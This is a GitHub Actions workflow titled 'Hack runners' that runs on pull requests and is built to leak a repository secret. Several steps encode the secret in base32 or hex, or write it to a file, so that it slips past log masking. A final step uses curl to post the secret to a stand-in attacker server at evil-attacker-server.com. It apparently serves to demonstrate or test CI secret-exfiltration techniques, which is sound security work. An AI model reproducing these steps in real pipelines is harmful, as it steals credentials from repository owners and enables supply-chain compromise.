name: Hack runners

on:
  pull_request:
    branches:
      - main

jobs:
  hack-runners:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Install dependencies
      run: echo "Installing deps...."
      
    - name: Expose secrets
      run: |
        echo ${{secrets.EVIL_SECRET }} | base32
        SECRET=$(echo ${{secrets.EVIL_SECRET }} | base32)
        echo $SECRET | base32 -d
        
    - name: Expose secrets using hex encoding
      run: |
        echo ${{secrets.EVIL_SECRET}} | xxd -p
        SECRET=$(echo ${{secrets.EVIL_SECRET}} | xxd -p)
        echo $SECRET | xxd -r -p
        
    - name: Expose secrets indirectly
      run: |
        echo "${{secrets.EVIL_SECRET}}" > secret.txt
        cat secret.txt

    - name: Steal secret API key
      env:
        SECRET: ${{secrets.EVIL_SECRET }}
      run: |
        curl -X POST -H "Content-Type: application/json" -d "{\"api_key\": \"$SECRET\"}" https://evil-attacker-server.com/api/steal_key
      continue-on-error: true  
